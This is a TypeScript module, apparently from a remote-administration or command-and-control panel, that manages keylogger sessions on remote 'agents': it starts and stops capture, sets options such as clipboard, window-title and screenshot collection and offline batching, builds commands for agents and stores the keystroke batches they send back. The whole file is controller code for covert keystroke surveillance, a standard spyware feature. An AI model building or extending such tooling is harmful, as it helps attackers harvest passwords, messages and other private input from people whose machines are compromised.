import { randomUUID } from 'crypto';
import type {
	KeyloggerCommandPayload,
	KeyloggerEventEnvelope,
	KeyloggerKeystroke,
	KeyloggerMode,
	KeyloggerSessionResponse,
	KeyloggerSessionState,
	KeyloggerStartConfig,
	KeyloggerTelemetryBatch,
	KeyloggerTelemetryState
} from '$lib/types/keylogger';

const MAX_BATCH_HISTORY = 25;

function cloneKeystroke(event: KeyloggerKeystroke): KeyloggerKeystroke {
	return structuredClone(event);
}

function cloneBatch(batch: KeyloggerTelemetryBatch): KeyloggerTelemetryBatch {
	return {
		batchId: batch.batchId,
		capturedAt: batch.capturedAt,
		totalEvents: batch.totalEvents,
		events: batch.events.map(cloneKeystroke)
	} satisfies KeyloggerTelemetryBatch;
}

interface KeyloggerSessionRecord {
	state: KeyloggerSessionState;
}

interface KeyloggerTelemetryRecord {
	batches: KeyloggerTelemetryBatch[];
	totalEvents: number;
	lastCapturedAt?: string;
}

function normalizeMode(mode?: KeyloggerMode | null): KeyloggerMode {
	if (mode === 'offline') {
		return 'offline';
	}
	return 'standard';
}

function normalizeConfig(config: KeyloggerStartConfig | undefined | null): KeyloggerStartConfig {
	const mode = normalizeMode(config?.mode);
	const normalized: KeyloggerStartConfig = {
		mode,
		cadenceMs: config?.cadenceMs ?? 250,
		batchIntervalMs: config?.batchIntervalMs ?? (mode === 'offline' ? 15 * 60 * 1000 : undefined),
		bufferSize: config?.bufferSize ?? (mode === 'offline' ? 5000 : 300),
		includeWindowTitles: config?.includeWindowTitles ?? mode !== 'offline',
		includeClipboard: config?.includeClipboard ?? false,
		emitProcessNames: config?.emitProcessNames ?? false,
		includeScreenshots: config?.includeScreenshots ?? false,
		encryptAtRest: config?.encryptAtRest ?? true,
		redactSecrets: config?.redactSecrets ?? true
	} satisfies KeyloggerStartConfig;
	return normalized;
}

export class KeyloggerManager {
	private sessions = new Map<string, KeyloggerSessionRecord>();
	private telemetry = new Map<string, KeyloggerTelemetryRecord>();

	getState(agentId: string): KeyloggerSessionResponse {
		const session = this.sessions.get(agentId);
		const telemetry = this.telemetry.get(agentId);
		return {
			session: session ? structuredClone(session.state) : null,
			telemetry: telemetry
				? {
						batches: telemetry.batches.map(cloneBatch),
						totalEvents: telemetry.totalEvents,
						lastCapturedAt: telemetry.lastCapturedAt
					}
				: { batches: [], totalEvents: 0 }
		} satisfies KeyloggerSessionResponse;
	}

	createSession(
		agentId: string,
		config: KeyloggerStartConfig,
		sessionId?: string
	): KeyloggerSessionState {
		const normalized = normalizeConfig(config);
		const identifier = sessionId?.trim() || randomUUID();
		const now = new Date();

		const record: KeyloggerSessionRecord = {
			state: {
				sessionId: identifier,
				agentId,
				mode: normalized.mode,
				startedAt: now.toISOString(),
				active: true,
				config: normalized,
				totalEvents: 0,
				lastCapturedAt: undefined
			}
		};
		this.sessions.set(agentId, record);
		this.ensureTelemetry(agentId);
		return structuredClone(record.state);
	}

	updateConfig(agentId: string, config: KeyloggerStartConfig): KeyloggerSessionState | null {
		const session = this.sessions.get(agentId);
		if (!session) {
			return null;
		}
		session.state.config = normalizeConfig(config);
		return structuredClone(session.state);
	}

	stopSession(agentId: string, sessionId?: string): KeyloggerSessionState | null {
		const session = this.sessions.get(agentId);
		if (!session) {
			return null;
		}
		if (sessionId && session.state.sessionId !== sessionId) {
			return null;
		}
		session.state.active = false;
		return structuredClone(session.state);
	}

	ingest(agentId: string, envelope: KeyloggerEventEnvelope): KeyloggerTelemetryState {
		if (!envelope || !Array.isArray(envelope.events)) {
			throw new Error('Invalid keylogger payload');
		}

		const session = this.sessions.get(agentId);
		if (session) {
			session.state.totalEvents =
				envelope.totalEvents ?? session.state.totalEvents + envelope.events.length;
			session.state.lastCapturedAt = envelope.capturedAt;
			session.state.mode = envelope.mode;
		}

		const telemetry = this.ensureTelemetry(agentId);
		const batchId = envelope.batchId || randomUUID();
		const batch: KeyloggerTelemetryBatch = {
			batchId,
			capturedAt: envelope.capturedAt,
			totalEvents: envelope.totalEvents ?? telemetry.totalEvents + envelope.events.length,
			events: envelope.events.map(cloneKeystroke)
		};

		telemetry.totalEvents = batch.totalEvents;
		telemetry.lastCapturedAt = envelope.capturedAt;
		telemetry.batches = [batch, ...telemetry.batches].slice(0, MAX_BATCH_HISTORY);

		return {
			batches: telemetry.batches.map(cloneBatch),
			totalEvents: telemetry.totalEvents,
			lastCapturedAt: telemetry.lastCapturedAt
		} satisfies KeyloggerTelemetryState;
	}

	buildCommand(
		action: KeyloggerCommandPayload['action'],
		session: KeyloggerSessionState
	): KeyloggerCommandPayload {
		return {
			action,
			sessionId: session.sessionId,
			mode: session.mode,
			config: session.config
		} satisfies KeyloggerCommandPayload;
	}

	private ensureTelemetry(agentId: string): KeyloggerTelemetryRecord {
		let telemetry = this.telemetry.get(agentId);
		if (!telemetry) {
			telemetry = { batches: [], totalEvents: 0 };
			this.telemetry.set(agentId, telemetry);
		}
		return telemetry;
	}
}

export const keyloggerManager = new KeyloggerManager();
